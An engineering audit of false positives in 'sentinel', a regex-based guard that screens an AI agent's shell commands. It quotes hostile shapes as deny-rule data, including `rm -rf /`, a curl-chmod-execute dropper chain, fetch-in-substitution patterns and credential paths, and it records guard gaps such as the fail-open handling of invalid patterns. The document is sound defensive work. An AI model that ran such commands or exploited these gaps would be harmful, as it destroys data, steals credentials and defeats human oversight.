# policy false-positive audit, august 2026

a month of enforcement data said the guard was blocking real work. this is what
the data showed, what changed, and what deliberately did not.

## where the data came from

`~/.sentinel/audit.jsonl` records every decision but not the payload. session
transcripts hold the payload but not the verdict. joining them on `tool_use_id`
(present on audit records since 2026-07-14) recovers the actual command behind
each block.

| | count |
|---|---|
| lifetime allow | 105,893 |
| lifetime block | 1,168 |
| lifetime warn | 1,421 |
| block/warn carrying a `tool_use_id` | 517 |
| **payload recovered by transcript join** | **369** (96 block, 273 warn) |

coverage is honest: 369 of 2,589 lifetime block/warn events. everything below is
grounded in those 369. pre-2026-07-14 events carry no `tool_use_id` and cannot be
joined; they are not represented.

## what the recovered blocks actually were

classification of the 96 recovered blocks, per rule family:

| family | true positive | false positive | self-test |
|---|---|---|---|
| destructive-rm | 0 | 26 | 11 |
| fetch-exec | 0 | 24 | 4 |
| exfil-cmds | 0 | 57 | 0 |
| cred-paths | 1 | 11 | 0 |
| self-protect | 0 | 3 | 4 |

"self-test" is the guard correctly blocking attack strings the user fired at it
on purpose - sentinel's own red-team runs and mycel test fixtures embedding
`rm -rf /` as assertion data. those stay blocked and should.

the single true positive in the whole corpus was a credential-path read. every
other block was either benign work or a deliberate test.

## what changed

three edits ship. each one replaces a rule whose regex matched a *shape* rather
than a *threat*.

### 1. recursive-delete rules (19 events)

the old rule was `rm\s+-rf\s+(?:[^\s]+\s+)*/` - "any token beginning with `/`".
that is every absolute path on the machine, so worktree teardown, `mktemp -d`
cleanup and `rm -rf "$WT/node_modules"` all blocked. the token run was also
unscoped and crossed `;`/`&&`/`|`, so a command could match on an unrelated path
in a *later* statement.

replaced by five rules that name the dangerous targets: root-equivalent globs,
system trees, whole home/volume at depth 1-2, credential dirs in both tilde and
absolute form, and wildcard sweeps over home dot-entries.

existing absolute operands are resolved before classification, so a symlinked
prefix followed by `..` cannot hide the real target. `/mnt` and `/media` use the
same bounded depth rule as `/Volumes`; project paths below a named mount remain
allowed. the exact Linux `/tmp` root is protected without matching `/tmp/<job>`.

that last one closes a hole the old policy never covered: `rm -rf ~/.c*` expands
to `.claude` and `.sentinel` but carries neither literal token, so the
guard-disarm rules could not see it. PreToolUse observes the pre-expansion
string.

**accepted residual:** absolute paths at depth 3+ are no longer blocked, so
`rm -rf /Volumes/T7/some-project` now passes where it previously did not. that is
the deliberate trade behind 19 false positives and zero true positives, and those
trees are git-backed. widening depth coverage would restore exactly the defect
being removed; add specific crown-jewel paths to a named rule instead.

### 2. interpreter fetch-exec (7 events)

the old rule OR'd bare words, so `\bexec\b` matched the *filename*
`fetch-exec.json`, `subprocess` matched any list-argv call to a trusted CLI, and
`requests` matched the english word.

split into three rules keyed on calls rather than words: a fetch side (raw
network I/O from an inline script), an exec side (shell-string execution, fd
hijack, dynamic eval), and an additive co-occurrence rule. the two halves stay
independent because each is load-bearing alone - the fetch side is the only rule
in the policy covering raw interpreter network egress, and the exec side is what
stops base64 payload laundering, which otherwise bypasses every other
`deny.commands` regex at once. fixed list and tuple argv calls remain allowed;
either literal form blocks when argv[0] is a shell, and a shell-valued Python
`executable=` override blocks as the same execution primitive.

### 3. staged fetch-then-run (1 event)

`\b(ba|z|da)?sh\b` matches a file extension as readily as a command, so
`curl -o install.sh URL && wc -l install.sh` blocked on the `.sh` in the
filename.

the replacement only consumes enumerated shell constructs between the separator
and the interpreter, so a bare word like `wc` can never be crossed. a companion
rule covers `chmod +x`, which the old rule caught only by accident through the
same extension match - without it, `curl -o x.sh URL && chmod +x x.sh && ./x.sh`,
the most common real dropper shape, would go unblocked.
direct execution is correlated to the exact downloaded output path, including
attached short output operands such as `-o/tmp/x` and `-O/tmp/x`.

## what deliberately did not change

four false-positive classes stay blocked. relaxing them was proposed, and an
adversarial pass constructed a working bypass for each.

| rule | false-positive class | why it stays | workaround |
|---|---|---|---|
| `\$\(\s*(curl\|wget\|fetch)\b` | capturing a fetch into a variable (15 events, the largest single class) | only rule covering command-substitution RCE. "is this substitution in executed position" is not a regex-decidable property of a shell string | don't wrap the fetch in `$(...)`; every observed shape has a substitute |
| `~/.ssh/*` | reading `~/.ssh/config` for a host alias | crown jewels; a path carve-out is stageable | `ssh -G <host>` resolves host settings with no path token |
| `~/.cargo/credentials.toml` | existence check, never a content read | same | `ls ~/.cargo \| grep cred` |
| staged fetch-then-run | `-o /dev/null` liveness poll | narrowing the gap blocks 1 of 14 dropper shapes | split poll and execution into two calls |

## how it was verified

every claim below was produced by running the real binary, not by reading regexes.

1. **`sentinel policy-lint`** - clean, no findings.
2. **`sentinel verify`** - 45/45 pinned attack and benign cases behave as expected.
3. **decision diff over the recovered corpus** - all 369 payloads replayed
   through `sentinel check --json` against a sandboxed `$HOME`, old policy vs new.
   49 decisions flip: 32 block→allow (all manually confirmed benign: worktree and
   temp cleanup, `node_modules` removal, and one download-then-`wc -l`), 15
   block→block under a renamed rule, 2 block→warn. no allow→block.
4. **explicit test cases** - 101 attack cases must still block and 38 benign
   controls must pass. all 139 pass.

the harness points `HOME` at a throwaway policy directory, so nothing touches the
live guard. `~`-prefixed path patterns are rewritten to the literal home path in
the test copy, otherwise they would silently stop matching under the override and
every path rule would appear to pass.

## known issues surfaced, not fixed here

- **an uncompilable deny pattern fails open.** `matcher.rs` returns `false` on a
  `Regex::new` error with only a `tracing::warn!`, so a typo'd pattern silently
  becomes a permanent no-op - including, hypothetically, the only root-deletion
  rule. `policy-lint` catches invalid regex but is opt-in, not a load-time gate.
  with `on_failure = "closed"` as the configured posture, this should refuse the
  policy load.
- **three path-extraction bugs** produce blocks no policy edit can reach: the
  deglob fail-safe projects a candidate's `*` onto a rule literal so
  `grep -rl ~/*/Cargo.toml` synthesises `~/.ssh/Cargo.toml`; `candidate_forms`
  canonicalizes `-e` argument values, turning a search pattern into a path; and
  heredoc bodies bound for a remote `ssh host 'bash -s'` are mined against the
  local filesystem.
- **block messages do not name the matched rule.** the deny reason reaches the
  agent without a rule identifier, so a blocked agent cannot tell which rule (or
  which guard, when ghost wraps sentinel) fired, and guesses. this is why blocks
  were repeatedly misattributed.
